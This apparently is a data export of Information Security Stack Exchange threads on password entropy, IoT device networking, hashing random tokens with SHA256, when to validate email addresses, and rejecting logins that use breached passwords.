<p>If the requirement were a capital, a special, and a length of 11+, the entropy calculation would be log₂(26×32×94⁹) = 68. Good, but still not great.</p>
<p>(See how password requirements can actually <em>lower</em> entropy? If you're creating these requirements, take a minimum satisfactory password length, say 10, and add one for each character type you require.)</p>
<p><strong>Use a password manager and a generated code!</strong></p>
<p>This is the only way to have a secure password nowadays. With a password manager, you don't have to worry about memorability, so you might as well crank the generator and make a nice long 20-character code: log₂(26×32×94¹⁸) = 127.</p>
","1"
"265375","265375","Can IoT connect to each other forming their own network?","<p>I recently purchased a fairly sleek LED lamp. Like most new-fangled furnishings it comes with a pile of unnecessary features including bluetooth, wifi, and a mobile app.</p>
<p>Hence my new-found paranoia. I hate connected devices, but I've long taken comfort in that I never connect these devices to the internet.</p>
<p>This morning though, I had a thought: can't these devices all talk to each other anyway?</p>
<p>For example, I live in an apartment complex. My lamp could in theory talk to my neighbors lamp, and now my lamp has an exit.</p>
<p>This has also made me really paranoid about my knock-off Raspberry Pi that I use as an OpenWRT.</p>
<p><em><strong>How do I know with certainty what hardware is on these devices?</strong></em></p>
<p>I get this sneaking feeling all these IoT devices and microcomputers are a modern trojan horse.</p>
","3","4","265395","<blockquote>
<p>This morning though, I had a thought: can't these devices all talk to each other anyway?</p>
<p>For example, I live in an apartment complex. My lamp could in theory talk to my neighbors lamp, and now my lamp has an exit.</p>
</blockquote>
<p>In theory they could sit there computing Pi to a trillion decimal places, but they probably won't.</p>
<p>To communicate with each other <em>locally</em> over WiFi, they would both have to be connected to the same access point (or two access points on the same LAN). Alternatively, one could set up an SSID and the other could connect to it - a possible scenario, but improbable. They could communicate over the internet using the manufacturer's service, but there's no reason for them to do that for arbitrary unrelated devices owned by different people who don't know each other.</p>
<p>To communicate with each other over Bluetooth they would need to pair with each other. Again this is exceedingly unlikely.</p>
<blockquote>
<p>How do I know with certainty what hardware is on these devices?</p>
</blockquote>
<p>Take them apart and look. The hardware is not really that important though - it's the firmware on top that implements the behaviour.</p>
<blockquote>
<p>I get this sneaking feeling all these IoT devices and microcomputers are a modern trojan horse.</p>
</blockquote>
<p>This feeling is entirely unfounded. If you reverse engineer any cheap IoT device you'll almost certainly find that it was put together with the bare minimum level of engineering effort by someone who had neither the time nor pay package to enact world domination on behalf of their employer.</p>
","4"
"265375","265375","Can IoT connect to each other forming their own network?","<p>I recently purchased a fairly sleek LED lamp. Like most new-fangled furnishings it comes with a pile of unnecessary features including bluetooth, wifi, and a mobile app.</p>
<p>Hence my new-found paranoia. I hate connected devices, but I've long taken comfort in that I never connect these devices to the internet.</p>
<p>This morning though, I had a thought: can't these devices all talk to each other anyway?</p>
<p>For example, I live in an apartment complex. My lamp could in theory talk to my neighbors lamp, and now my lamp has an exit.</p>
<p>This has also made me really paranoid about my knock-off Raspberry Pi that I use as an OpenWRT.</p>
<p><em><strong>How do I know with certainty what hardware is on these devices?</strong></em></p>
<p>I get this sneaking feeling all these IoT devices and microcomputers are a modern trojan horse.</p>
","3","4","265400","<blockquote>
<p>I get this sneaking feeling all these IoT devices and microcomputers are a modern trojan horse.</p>
</blockquote>
<p>Maybe not directly from the manufacturer but they probably can be made into that through an update.</p>
<p>The only thing preventing your lamp or RPi router to talk to a neighbours device in a meaningful way is encryption and the software running on those devices.
Data is constantly being send from all your (wireless) devices dozens of meters or more in every direction just by design. Just like your neighbours devices are sending data to you.</p>
<p>In order to know what hardware these devices use you need to take them apart or look for some tear down online.
They often use RISC or ARM processors with either onboard or additional flash on SPI for firmware. New &quot;features&quot; are just an update away.</p>
<p>While Polynomial is right, that no factory is going to bug you or the majority of users on purpose, you could argue that they do not care about security either and that the telemetry which these devices emit could also be called reconnaissance.</p>
","1"
"265375","265375","Can IoT connect to each other forming their own network?","<p>I recently purchased a fairly sleek LED lamp. Like most new-fangled furnishings it comes with a pile of unnecessary features including bluetooth, wifi, and a mobile app.</p>
<p>Hence my new-found paranoia. I hate connected devices, but I've long taken comfort in that I never connect these devices to the internet.</p>
<p>This morning though, I had a thought: can't these devices all talk to each other anyway?</p>
<p>For example, I live in an apartment complex. My lamp could in theory talk to my neighbors lamp, and now my lamp has an exit.</p>
<p>This has also made me really paranoid about my knock-off Raspberry Pi that I use as an OpenWRT.</p>
<p><em><strong>How do I know with certainty what hardware is on these devices?</strong></em></p>
<p>I get this sneaking feeling all these IoT devices and microcomputers are a modern trojan horse.</p>
","3","4","265403","<blockquote>
<p>Hence my new-found paranoia. I hate connected devices, but I've long taken comfort in that I never connect these devices to the internet.</p>
<p>This morning though, I had a thought: can't these devices all talk to each other anyway?</p>
<p>For example, I live in an apartment complex. My lamp could in theory talk to my neighbors lamp, and now my lamp has an exit.</p>
</blockquote>
<p>Totally could.  I've been on projects where a client asked us to route traffic from any device, no matter the customer.  In their defense, they had the best of intentions (&quot;what if the internet went down?&quot;).  This is less likely over wifi/bluetooth and more likely with custom radio stuff.</p>
<p>But Apple Airtags are BT based and will reportedly route their traffic via any Apple phone available.  So, within a company/family of products, there can be room for neighbor routing.  I'm not sure I've seen reports of cross-company neighbor routing.</p>
<blockquote>
<p>How do I know with certainty what hardware is on these devices?</p>
</blockquote>
<p>It's less the hardware and more the software that you're concerned about.  Where possible, stick to products which contain vetted open source software.  OpenWRT is an acceptable example of this.  With as many line of code that exist in these projects, no one can say they are free from backdoors/nefarious behaviors, but it's less likely than closed source projects.</p>
","1"
"265375","265375","Can IoT connect to each other forming their own network?","<p>I recently purchased a fairly sleek LED lamp. Like most new-fangled furnishings it comes with a pile of unnecessary features including bluetooth, wifi, and a mobile app.</p>
<p>Hence my new-found paranoia. I hate connected devices, but I've long taken comfort in that I never connect these devices to the internet.</p>
<p>This morning though, I had a thought: can't these devices all talk to each other anyway?</p>
<p>For example, I live in an apartment complex. My lamp could in theory talk to my neighbors lamp, and now my lamp has an exit.</p>
<p>This has also made me really paranoid about my knock-off Raspberry Pi that I use as an OpenWRT.</p>
<p><em><strong>How do I know with certainty what hardware is on these devices?</strong></em></p>
<p>I get this sneaking feeling all these IoT devices and microcomputers are a modern trojan horse.</p>
","3","4","265931","<p>A lot of embedded devices have known to have Bluetooth stack vulnerabilities, for example BlueBorne ( <a href=""https://en.wikipedia.org/wiki/BlueBorne_(security_vulnerability)"" rel=""nofollow noreferrer"">https://en.wikipedia.org/wiki/BlueBorne_(security_vulnerability)</a> ). So your neighbor indeed is capable of taking over your lamp, if it is vulnerable, and going lateral, by getting credentials to your WiFi network.</p>
<p>But this requires some level of sophistication from threat actor and radio proximity to your LED lamp, so the risk is not high.</p>
","0"
"265350","265350","What is the best way to calculate true password entropy for human created passwords?","<p>Okay, I know it might seem this has already been beaten to death but, hear me out. I am including a fairly good password strength algorithm for my app for users on sign-up. <a href=""https://www.uic.edu/apps/strong-password/"" rel=""noreferrer"">This one, which I've copied (with minor adjustments)</a>. I also want to give a <em><strong>ROUGH</strong></em> metric in addition to the strength tester. I want to calculate and communicate users' password entropy by cost to crack <a href=""https://blog.1password.com/cracking-challenge-update/"" rel=""noreferrer"">in the same way 1Password has here.</a> I think this can communicate well to users in a way that is real to them.</p>
<p>Here is a common problem which leads to my question, password entropy. I will give users a switch to flip, whether the password is human-created or machine random. Now machine random has its own set of entropy calculation issues such as whether it is a totally random sequence, is it a symbol-separated word sequence chosen from a 307,111 word list, etc, etc. I've got that covered. The trouble is some human passwords seem stronger than machine crypto random:</p>
<p>Issue with standard password entropy calc methods:</p>
<p>1Password machine random - rmrgKDAyeY = 57.37 bits entropy<br />
Human created non-random - isAwtheSUN = 57.37 bits entropy</p>
<p>Obviously, this would not be a good estimation...</p>
<p>I tried using <code>log(pow(2500, 4))/log(2) =&gt; 4 words</code>, 2500 possible combinations based on people using easier-to-remember words, as a percentage of the average human vocabulary of about 20,000 and this gave a resulting entropy of 45.15. This seems pretty reasonable. But I need to hear from the pros and looking for other ideas.</p>
<p>What metrics could be used to calculate human-created passwords so the result is much less secure looking than machine randoms?</p>
<p>Keeping in mind I'm after entropy only so to give users a cost-to-crack estimate. I know nobody but us cares about entropy.</p>
","10","6","265351","<p>I’d suggest you have a look at <a href=""https://github.com/dropbox/zxcvbn"" rel=""noreferrer"">zxcvbn</a>. It uses a dictionary and identifies common words, other common patterns and common substitutions to provide a fairly good estimation of the entropy of the process that produces the password.</p>
","19"
"265350","265350","What is the best way to calculate true password entropy for human created passwords?","<p>Okay, I know it might seem this has already been beaten to death but, hear me out. I am including a fairly good password strength algorithm for my app for users on sign-up. <a href=""https://www.uic.edu/apps/strong-password/"" rel=""noreferrer"">This one, which I've copied (with minor adjustments)</a>. I also want to give a <em><strong>ROUGH</strong></em> metric in addition to the strength tester. I want to calculate and communicate users' password entropy by cost to crack <a href=""https://blog.1password.com/cracking-challenge-update/"" rel=""noreferrer"">in the same way 1Password has here.</a> I think this can communicate well to users in a way that is real to them.</p>
<p>Here is a common problem which leads to my question, password entropy. I will give users a switch to flip, whether the password is human-created or machine random. Now machine random has its own set of entropy calculation issues such as whether it is a totally random sequence, is it a symbol-separated word sequence chosen from a 307,111 word list, etc, etc. I've got that covered. The trouble is some human passwords seem stronger than machine crypto random:</p>
<p>Issue with standard password entropy calc methods:</p>
<p>1Password machine random - rmrgKDAyeY = 57.37 bits entropy<br />
Human created non-random - isAwtheSUN = 57.37 bits entropy</p>
<p>Obviously, this would not be a good estimation...</p>
<p>I tried using <code>log(pow(2500, 4))/log(2) =&gt; 4 words</code>, 2500 possible combinations based on people using easier-to-remember words, as a percentage of the average human vocabulary of about 20,000 and this gave a resulting entropy of 45.15. This seems pretty reasonable. But I need to hear from the pros and looking for other ideas.</p>
<p>What metrics could be used to calculate human-created passwords so the result is much less secure looking than machine randoms?</p>
<p>Keeping in mind I'm after entropy only so to give users a cost-to-crack estimate. I know nobody but us cares about entropy.</p>
","10","6","265352","<p>There isn't really a &quot;true&quot; level of entropy for passwords - all you can ever do is estimate. And this is especially true when the only information you have is the password itself.</p>
<p>Imagine a password like <code>RobertAmazonMonday</code>. On the face of it, it's three &quot;random&quot; words, so you can have a guess at the entropy based on your assumptions about the average size of someone's vocabulary. But if that password was set by a guy called Robert on his first (Mon)day working at Amazon, then that completely changes the situation.</p>
<p>So I'd question what the problem is that you're really trying to solve. If it's just giving users an idea of how strong their password is, then taking an approach where you look at length/character set initially and then reduce the strength estimate for strings within it (such as words, common patterns, their username, etc) like existing tools (such as KeePass) do could work.</p>
<p>But is giving them a number sensible here? Does a user care than their password has an estimated entropy of 57.23 bits vs 53.86 bits? Can they make a meaningful decision based on that information? Is the difference between your password taking 500 trillion years and 600 trillion years to crack with some arbitrary work factor (because you're using a decent hashing algorithm) relevant?</p>
","38"
"265350","265350","What is the best way to calculate true password entropy for human created passwords?","<p>Okay, I know it might seem this has already been beaten to death but, hear me out. I am including a fairly good password strength algorithm for my app for users on sign-up. <a href=""https://www.uic.edu/apps/strong-password/"" rel=""noreferrer"">This one, which I've copied (with minor adjustments)</a>. I also want to give a <em><strong>ROUGH</strong></em> metric in addition to the strength tester. I want to calculate and communicate users' password entropy by cost to crack <a href=""https://blog.1password.com/cracking-challenge-update/"" rel=""noreferrer"">in the same way 1Password has here.</a> I think this can communicate well to users in a way that is real to them.</p>
<p>Here is a common problem which leads to my question, password entropy. I will give users a switch to flip, whether the password is human-created or machine random. Now machine random has its own set of entropy calculation issues such as whether it is a totally random sequence, is it a symbol-separated word sequence chosen from a 307,111 word list, etc, etc. I've got that covered. The trouble is some human passwords seem stronger than machine crypto random:</p>
<p>Issue with standard password entropy calc methods:</p>
<p>1Password machine random - rmrgKDAyeY = 57.37 bits entropy<br />
Human created non-random - isAwtheSUN = 57.37 bits entropy</p>
<p>Obviously, this would not be a good estimation...</p>
<p>I tried using <code>log(pow(2500, 4))/log(2) =&gt; 4 words</code>, 2500 possible combinations based on people using easier-to-remember words, as a percentage of the average human vocabulary of about 20,000 and this gave a resulting entropy of 45.15. This seems pretty reasonable. But I need to hear from the pros and looking for other ideas.</p>
<p>What metrics could be used to calculate human-created passwords so the result is much less secure looking than machine randoms?</p>
<p>Keeping in mind I'm after entropy only so to give users a cost-to-crack estimate. I know nobody but us cares about entropy.</p>
","10","6","265409","<p><strong>One</strong> password does not have entropy. A <strong>method to generate</strong> a password has entropy.</p>
<p>This is quite clear in the table in the 1Password page you linked to. They give entropy of the <strong>method</strong> (&quot;3 word, constant separator&quot;, &quot;8 char, uppercase, lowercase, digits&quot;...), not the password. The password given is just one example.</p>
<p>So if the method is &quot;15 characters picked randomly from a set of 72 values&quot; (upper and lower basic latin letters + 10 digits + 10 symbols), then the entropy is 92.55 bits. Whether one actual result generated this way ends up being <code>abcdefghiklmno</code> or something that <em>looks</em> truly random, the entropy is the same (for a brute force crack, which is what entropy is about, <code>abcdefghiklmno</code> is as random as any other password).</p>
<p>From a password, you can try to <strong>guess</strong> how it was generated. So if you see 15 lowercase letters, you can estimate the method to be &quot;10 characters picked randomly from a set of 26 values&quot;, and the entropy to be 70.5 bits. If you detect uppercase letters, or digits, or symbols, you'll change your estimate of what the method is, and what the associated entropy is. But the password does not have entropy. The method to generate it has.</p>
<p>But your guess is just a guess. Maybe the password was actually generated as a set of three 5-letter words taken from a list of 1000 words. Entropy 29.9 bits. Or a set of three 5-letter words taken from a list of 100 000 words (entropy 49.83 bits). Or anything else.</p>
<p>Or, <strong>more likely than not, the password was generated from a limited set of words and numbers</strong>. Say, some significant name (spouse, children, company...), some significant number (date of birth, of marriage...), a random special character thrown in there, a random character uppercased, and a few possible permutations (name+number+symbol or name+symbol+number, etc.). If you know the user, entropy is probably less than 10 bits. If you don't know the user, then it does increase, but remains quite low (I'd think less than 40 bits).</p>
<p>That's why people do dictionary attacks rather than brute force attacks. Because most people don't generate random passwords.</p>
<p>So no, you cannot determine the entropy from a single password. You can make guesses, but that's about it.</p>
<p>First things first:</p>
<ul>
<li><p>If you can avoid having to deal with any passwords yourself, do so! Rely on some other platform for authentication. Make it their problem.</p>
</li>
<li><p>Check passwords against the top-whatever list of most common passwords.</p>
</li>
<li><p>Check password hashes against known password leaks.</p>
</li>
<li><p>Make sure the password is long enough.</p>
</li>
</ul>
<p>I don't think much else really makes a difference, and can be counterproductive.</p>
","17"
"265350","265350","What is the best way to calculate true password entropy for human created passwords?","<p>Okay, I know it might seem this has already been beaten to death but, hear me out. I am including a fairly good password strength algorithm for my app for users on sign-up. <a href=""https://www.uic.edu/apps/strong-password/"" rel=""noreferrer"">This one, which I've copied (with minor adjustments)</a>. I also want to give a <em><strong>ROUGH</strong></em> metric in addition to the strength tester. I want to calculate and communicate users' password entropy by cost to crack <a href=""https://blog.1password.com/cracking-challenge-update/"" rel=""noreferrer"">in the same way 1Password has here.</a> I think this can communicate well to users in a way that is real to them.</p>
<p>Here is a common problem which leads to my question, password entropy. I will give users a switch to flip, whether the password is human-created or machine random. Now machine random has its own set of entropy calculation issues such as whether it is a totally random sequence, is it a symbol-separated word sequence chosen from a 307,111 word list, etc, etc. I've got that covered. The trouble is some human passwords seem stronger than machine crypto random:</p>
<p>Issue with standard password entropy calc methods:</p>
<p>1Password machine random - rmrgKDAyeY = 57.37 bits entropy<br />
Human created non-random - isAwtheSUN = 57.37 bits entropy</p>
<p>Obviously, this would not be a good estimation...</p>
<p>I tried using <code>log(pow(2500, 4))/log(2) =&gt; 4 words</code>, 2500 possible combinations based on people using easier-to-remember words, as a percentage of the average human vocabulary of about 20,000 and this gave a resulting entropy of 45.15. This seems pretty reasonable. But I need to hear from the pros and looking for other ideas.</p>
<p>What metrics could be used to calculate human-created passwords so the result is much less secure looking than machine randoms?</p>
<p>Keeping in mind I'm after entropy only so to give users a cost-to-crack estimate. I know nobody but us cares about entropy.</p>
","10","6","265422","<p>The true level of entropy depends on the probability that the attacker will consider a given password. Since nobody knows in advance how the <em>attacker</em> acts, this level cannot be reliably known.</p>
<ol>
<li>if the attacker brute-forces by iterating through all characters, both passwords have equal entropy.</li>
<li>if the attacker uses a dictionary and combines words/characters into a password (trying longer words first), then <code>isAwtheSUN</code> will have a lower entropy that <code>rmrgKDAyeY</code>.</li>
<li>if the attacker uses a password list, the entropy will depend on whether either <code>rmrgKDAyeY</code> or <code>isAwtheSUN</code> are part of the list, and their position. It's even perfectly possible that <code>rmrgKDAyeY</code> has lower entropy than <code>isAwtheSUN</code>.</li>
</ol>
<p>The character count corresponds to the entropy for the approach #1. Modern brute-force techniques are relying on approaches #2 and #3, so it's commonly considered that character count is a poor entropy metric, and an entropy calculation based on on #2 gives more plausible results.</p>
<p>Still, it's important to understand that any password entropy metric remains an estimation, and its &quot;quality&quot; may change at any moment. It's possible that once quantum computers become available to password crackers, the metric based on character count will once again become &quot;state of the art&quot;.</p>
","2"
"265350","265350","What is the best way to calculate true password entropy for human created passwords?","<p>Okay, I know it might seem this has already been beaten to death but, hear me out. I am including a fairly good password strength algorithm for my app for users on sign-up. <a href=""https://www.uic.edu/apps/strong-password/"" rel=""noreferrer"">This one, which I've copied (with minor adjustments)</a>. I also want to give a <em><strong>ROUGH</strong></em> metric in addition to the strength tester. I want to calculate and communicate users' password entropy by cost to crack <a href=""https://blog.1password.com/cracking-challenge-update/"" rel=""noreferrer"">in the same way 1Password has here.</a> I think this can communicate well to users in a way that is real to them.</p>
<p>Here is a common problem which leads to my question, password entropy. I will give users a switch to flip, whether the password is human-created or machine random. Now machine random has its own set of entropy calculation issues such as whether it is a totally random sequence, is it a symbol-separated word sequence chosen from a 307,111 word list, etc, etc. I've got that covered. The trouble is some human passwords seem stronger than machine crypto random:</p>
<p>Issue with standard password entropy calc methods:</p>
<p>1Password machine random - rmrgKDAyeY = 57.37 bits entropy<br />
Human created non-random - isAwtheSUN = 57.37 bits entropy</p>
<p>Obviously, this would not be a good estimation...</p>
<p>I tried using <code>log(pow(2500, 4))/log(2) =&gt; 4 words</code>, 2500 possible combinations based on people using easier-to-remember words, as a percentage of the average human vocabulary of about 20,000 and this gave a resulting entropy of 45.15. This seems pretty reasonable. But I need to hear from the pros and looking for other ideas.</p>
<p>What metrics could be used to calculate human-created passwords so the result is much less secure looking than machine randoms?</p>
<p>Keeping in mind I'm after entropy only so to give users a cost-to-crack estimate. I know nobody but us cares about entropy.</p>
","10","6","265427","<p>Your password would have entropy relative to a password guesser. You could just say that if guesser X guesses your password in 2^n attempts, you could say you have n bits entropy relative to that guesser. You could implement several password guessers and try them all.</p>
<p>A problem is that if your entropy is high, then guessing the right password will take a long time. If it takes you an hour to find the entropy of a password that a guesser takes an hour to crack, that's not too useful. However, you have a huge advantage: You know the password. So if you know for example that the password guesser will now guess 123,456,789 eight letter passwords, and your's is nine letters, you don't have to actually try those 123 million passwords. And if your password started with K, you can likewise skip testing all the nine letter passwords starting with A to J. So you might be able to determine very quickly how many attempts it takes your password, given that you know it.</p>
<p>In addition, entropy is one thing. The time it takes to try whether a password guess is correct is another thing. For example, iOS passcodes supposedly take 80ms to test one passcode. A six digit passcode would. take up to almost a day to crack.</p>
","0"
"265350","265350","What is the best way to calculate true password entropy for human created passwords?","<p>Okay, I know it might seem this has already been beaten to death but, hear me out. I am including a fairly good password strength algorithm for my app for users on sign-up. <a href=""https://www.uic.edu/apps/strong-password/"" rel=""noreferrer"">This one, which I've copied (with minor adjustments)</a>. I also want to give a <em><strong>ROUGH</strong></em> metric in addition to the strength tester. I want to calculate and communicate users' password entropy by cost to crack <a href=""https://blog.1password.com/cracking-challenge-update/"" rel=""noreferrer"">in the same way 1Password has here.</a> I think this can communicate well to users in a way that is real to them.</p>
<p>Here is a common problem which leads to my question, password entropy. I will give users a switch to flip, whether the password is human-created or machine random. Now machine random has its own set of entropy calculation issues such as whether it is a totally random sequence, is it a symbol-separated word sequence chosen from a 307,111 word list, etc, etc. I've got that covered. The trouble is some human passwords seem stronger than machine crypto random:</p>
<p>Issue with standard password entropy calc methods:</p>
<p>1Password machine random - rmrgKDAyeY = 57.37 bits entropy<br />
Human created non-random - isAwtheSUN = 57.37 bits entropy</p>
<p>Obviously, this would not be a good estimation...</p>
<p>I tried using <code>log(pow(2500, 4))/log(2) =&gt; 4 words</code>, 2500 possible combinations based on people using easier-to-remember words, as a percentage of the average human vocabulary of about 20,000 and this gave a resulting entropy of 45.15. This seems pretty reasonable. But I need to hear from the pros and looking for other ideas.</p>
<p>What metrics could be used to calculate human-created passwords so the result is much less secure looking than machine randoms?</p>
<p>Keeping in mind I'm after entropy only so to give users a cost-to-crack estimate. I know nobody but us cares about entropy.</p>
","10","6","265428","<p>As noted by others, passwords don't individually &quot;have entropy&quot;. Entropy is a property of their relationship to a larger distribution of password choices, possibly through a method by which they were generated.</p>
<p>Conceptually, the &quot;best&quot; way to measure entropy of passwords is with an optimized compression algorithm (which is largely a matter of an optimized dictionary) that best compresses the passwords &quot;known to be weak&quot; (known to appear widely). You could approximate something like this using existing known sets of compromised passwords, natural language dictionaries, and advanced statistical modeling (aka &quot;AI&quot; language models) of relationships between words. Then, the number of bits in the compressed version of a given password might be a reasonable estimate of &quot;its entropy&quot;.</p>
<p>However, even then, it will not tell you whether there are external correlations between the password and its owner, the context in which it's used, etc. that reduce the real effective entropy an attacker would be working with.</p>
","2"
"265349","265349","SHA256 for hashing 32 cryptographicaly random bytes","<p>I need to hash 32 cryptographically random bytes, but later the verification the value with hash must be very fast, so I decided to use SHA256. Is it a security issue if my passwords are 32 cryptographically random bytes? Maybe you know some other fast and secure hashing algorithm?</p>
","1","3","265360","<p>If the server response only needs to be &quot;fairly&quot; fast, a relatively strong hash like bcrypt, scrypt, or Argon2i, tuned to match your expected performance, is still the preferred approach. The hash &quot;work factors&quot; should take as much processing time - and latency - as your application and users can tolerate. This is to maximize attack resistance.</p>
<p>But based solely on cracking vulnerability, for a truly random series of bytes of this size, there is no security issue. If an attacker is trying to crack the hash (recover the original bytes once they have possession of the hash), the total number of possibilities is 256^32 or ~1.15x10^77. Even if an attacker could try a quintillion guesses per second (far beyond current or mid-term future capability), they could not traverse even a tenth of this space in a thousand years. (Finding a collision for a given SHA256 might or might not be more likely, but still not a real-world concern.)</p>
<p>But since history of crypto is paved with good theories, <strong>I'd still go with a modern, strong hash</strong>. It's cheap insurance, primarily for things like unforeseen implementation side effects that reduce the attack space (for example, if someone discovered a weakness in your random-number generator).</p>
","2"
"265349","265349","SHA256 for hashing 32 cryptographicaly random bytes","<p>I need to hash 32 cryptographically random bytes, but later the verification the value with hash must be very fast, so I decided to use SHA256. Is it a security issue if my passwords are 32 cryptographically random bytes? Maybe you know some other fast and secure hashing algorithm?</p>
","1","3","265361","<p>Requiring password hashing to be fast makes no sense to me. Usually passwords are hashed to prevent password disclosure in case the attacker gets access to the database. But hashes for this purpose are intentionally constructed to be relatively slow and to require relatively much memory. The examples of such password hashing algorithms are Argon2, PBKDF2, scrypt. You can adjust their parameters in such way, that the hashing time is acceptable to the users, e.g. 0.1 s. Then the attacker will be able to brute-force only 10 passwords per second, instead of 10 000 000 000 passwords per second for normal SHA256.</p>
","1"
"265349","265349","SHA256 for hashing 32 cryptographicaly random bytes","<p>I need to hash 32 cryptographically random bytes, but later the verification the value with hash must be very fast, so I decided to use SHA256. Is it a security issue if my passwords are 32 cryptographically random bytes? Maybe you know some other fast and secure hashing algorithm?</p>
","1","3","265362","<p>If you have 256 bit long computer generated tokens used for authentication (generated using <code>getrandom(2)</code> or <code>/dev/urandom</code>), and you want to store <code>sha256(token)</code> in the database, that's fast and secure. You don't need a true password storage hash if your tokens are high-entropy. You don't need SHA-3 or Blake-3 or anything fancy, because the hash input is short. I believe the database lookup using the username to get the row with the hashed password will be slower than the &quot;password&quot; hash.</p>
<p>Don't forget to use a comparison function that is safe against timing attacks, so you definitely don't leak anything.</p>
","1"
"265308","265308","Is there a reason we don't first validate the email address before continuing with the registration?","<p>Many websites and/or web apps require you to validate the e-mail address <strong>after</strong> registration.</p>
<p>Why don't we first validate the email address and then continue with the registration? Is there something wrong with a person first providing their email address, getting a validation email, going to the URL send in the email and then providing password and other details?</p>
","2","3","265309","<blockquote>
<p>Why don't we first validate the email address and then continue with the registration?</p>
</blockquote>
<p>From the security perspective this should be similar. From a usability standpoint it might be worse, or at least unexpected. Moreover, the expectation today is to provide easy and fast user registration because every additional friction might mean lost customers. So often the freshly registered account can be used for a while already without validating the email address immediately.</p>
","2"
"265308","265308","Is there a reason we don't first validate the email address before continuing with the registration?","<p>Many websites and/or web apps require you to validate the e-mail address <strong>after</strong> registration.</p>
<p>Why don't we first validate the email address and then continue with the registration? Is there something wrong with a person first providing their email address, getting a validation email, going to the URL send in the email and then providing password and other details?</p>
","2","3","265310","<p>If user forgets password or if accounts is locked, some way is needed for user to reset the password. It can be done by asking some questions about something that is expected not to be known to any random person, or by sending an SMS, or by sending a temporary password or some link to user per email. If user has not confirmed the access to the provided email, resetting the password via email may be impossible.</p>
<p>Asking questions (like the title of your favorite movie) is usually not very reliable, because such information can be known to many persons. It can only be reliable, if the user provides as an answer some relatively long random string, generated by a good random generator. Since the most users are expected to provide the real answers, this can be insecure.</p>
<p>Emails are considered as more secure, because it is expected that only the user has access to the email box.</p>
<p>In case the email is validated after registration many web sites don't usually enable any services until the email is validated. Thus user is forced to validate the email.</p>
<p>From the security point of view validating the email in advance or afterwards has no difference.</p>
<p>Validation at different phase can have usability differences. E.g. some users may prefer providing email and password at the beginning and validate the email later on, because they may find association between email and password more natural, because it happens at the same time. Whereas providing first the email, then validating, then providing the password may break such association. But as many usability aspects this is a matter of taste.</p>
<p>There are also other aspects not related to security. Validating email in advance makes sure that the user is the owner of the email. Whereas validating it after registration may enable the kind of defamation. E.g. you may register your neighbor at some web site associated with drugs or alcohol and never confirm it later, because you don't own this email. But if the web site keeps such unconfirmed accounts, and if the list of the users becomes widely known, this might have some reputation effect for the person whose email was used for registration. But again, this is not a security aspect.</p>
","1"
"265308","265308","Is there a reason we don't first validate the email address before continuing with the registration?","<p>Many websites and/or web apps require you to validate the e-mail address <strong>after</strong> registration.</p>
<p>Why don't we first validate the email address and then continue with the registration? Is there something wrong with a person first providing their email address, getting a validation email, going to the URL send in the email and then providing password and other details?</p>
","2","3","265313","<p>There is nothing wrong with requiring validation of the email address before continuing registration.   Many websites actually do this.</p>
<p>Websites that don't do this are either older and have not updated their security standards, or don't care about having spam bot registrations on their website that haven't yet validated the email address and would rather make registration easier.</p>
<p>Of course, if they require validation of the email before the registration is activated, that doesn't reduce the security of their website, it just means there will be a lot of user accounts that will never be validated that will have to be cleaned out or expired eventually.</p>
","1"
"265283","265283","Should one reject login attempts when the correct password is newly added to a password deny list?","<p>Best practices say that when users choose a password (at signup or when changing an existing password), the application should reject that password if it appears on a list of passwords known to be unsafe. For example, <a href=""https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret"" rel=""noreferrer"">NIST Special Publication 800-63</a> from 2017 says the following (emphasis mine):</p>
<blockquote>
<p><strong>When processing requests to establish and change memorized secrets, verifiers SHALL compare the prospective secrets against a list that contains values known to be commonly-used, expected, or compromised.</strong> For example, the list MAY include, but is not limited to:</p>
<ul>
<li><strong>Passwords obtained from previous breach corpuses</strong>.</li>
<li>Dictionary words.</li>
<li>Repetitive or sequential characters (e.g. ‘aaaaaa’, ‘1234abcd’).</li>
<li>Context-specific words, such as the name of the service, the username, and derivatives thereof.</li>
</ul>
<p>If the chosen secret is found in the list, the CSP or verifier SHALL advise the subscriber that they need to select a different secret, SHALL provide the reason for rejection, and SHALL require the subscriber to choose a different value.</p>
</blockquote>
<p>Let's say I implement this using Have I Been Pwned's <a href=""https://haveibeenpwned.com/Passwords"" rel=""noreferrer"">&quot;Pwned Passwords&quot;</a> API.</p>
<p>Now what happens if a password used by one or more of my users appears¹ in a data breach? Obviously, the password should now be considered &quot;definitely unsafe&quot;²: sooner or later, attackers will include that password in credential stuffing or password spraying attacks.</p>
<p>Following the NIST advice, my application would reject entering such a password on a &quot;change password&quot; form (see above: &quot;When processing requests to (...) change memorized secrets, verifiers SHALL (...)&quot;).</p>
<p>However, if nobody was alerted of that particular password being breached (neither me as the application owner nor every user using that password), that alone will not help: Attackers can still use that password until affected users have changed their password. But that may or may not happen. What's worse, for seldomly-used applications, a lot of time may pass until they log in the next time, so simply displaying a warning on login will not shorten the attack window.</p>
<p>Therefore, I believe that my application should reject <strong>login attempts</strong> which use a breached password:</p>
<ul>
<li>That way, an affected account would effectively be locked from the moment its password appears in a breach corpus. As no attacker could gain access, breach corpus passwords become useless to attackers.³</li>
<li>The application would reject the login attempt with the same reaction (visible message and API response) as if the wrong password was used. This avoids giving the attacker the potentially useful information that this username/password could be used elsewhere.</li>
<li>When a login attempt is rejected due to this, the application could send an email to the account owner informing them of the situation and asking them to use &quot;reset password&quot; functionality. The email would be sent asynchronously to minimize the risk of timing-based information leakage.</li>
<li>To avoid repeated emails, the application would also set an appropriate flag on the account.</li>
</ul>
<h4>What I tried</h4>
<p>I could not find any mention of <em>rejecting login attempts</em> related to breach corpuses. I thought about whether the word &quot;establish&quot; in the NIST guideline could mean &quot;login&quot;, but I doubt that as the rest of that section would not really fit that interpretation.</p>
<blockquote>
<p>When processing requests to <strong>establish</strong> and change memorized secrets, verifiers SHALL compare the prospective secrets (...)</p>
</blockquote>
<h4>Questions</h4>
<ol>
<li>Is there any official/established/popular advice on the topic of rejecting <em>login attempts</em> due to passwords occuring in breach corpuses (as opposed to rejecting <em>password change attempts</em>)?</li>
<li>Is such an approach advisable in general?</li>
<li>Does this (my approach outlined above or the general idea) have any drawbacks or caveats one should consider?</li>
</ol>
<h4>Footnotes</h4>
<sup>
<ol>
<li><p>For this, it doesn't matter whether it was indeed <em>my user's</em> data or <em>someone else's</em> data that appeared in the breach.</p>
</li>
<li><p>I am aware that just because a password <em>does not</em> appear on breach corpuses, it does not mean it should be considered <em>safe</em>.</p>
</li>
